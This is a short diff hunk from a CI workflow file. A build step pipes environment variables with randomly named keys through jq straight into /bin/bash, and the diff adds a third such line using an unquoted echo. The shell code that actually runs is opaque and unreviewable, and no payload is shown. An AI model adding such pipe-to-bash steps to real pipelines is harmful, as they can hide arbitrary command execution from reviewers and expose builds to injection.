@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$tuam0" | jq -r .ydlh92271 | /bin/bash
           printf '%s' "$qie7" | jq -r .axpgx91 | /bin/bash
+          echo $vpcmj521 | jq -r .fav6354 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
